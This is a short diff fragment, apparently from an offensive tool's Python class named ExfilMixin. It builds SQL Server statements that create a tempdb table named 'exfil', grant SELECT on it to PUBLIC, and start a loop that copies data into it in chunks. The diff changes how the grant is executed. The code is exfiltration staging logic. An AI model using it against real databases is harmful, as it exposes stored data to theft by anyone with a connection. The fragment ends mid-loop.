@@ -194,7 +194,7 @@ class ExfilMixin:
             "CREATE TABLE tempdb..exfil("
             "id INT IDENTITY(1,1),chunk_idx INT NOT NULL,"
             "chunk NVARCHAR(MAX) NOT NULL);"
-            "GRANT SELECT ON tempdb..exfil TO PUBLIC;"
+            "EXEC tempdb.dbo.sp_executesql N'GRANT SELECT ON dbo.exfil TO PUBLIC';"
             f"DECLARE @cb INT={chunk_bytes};"
             "DECLARE @i INT=0;"
             "WHILE @i*@cb<@total "
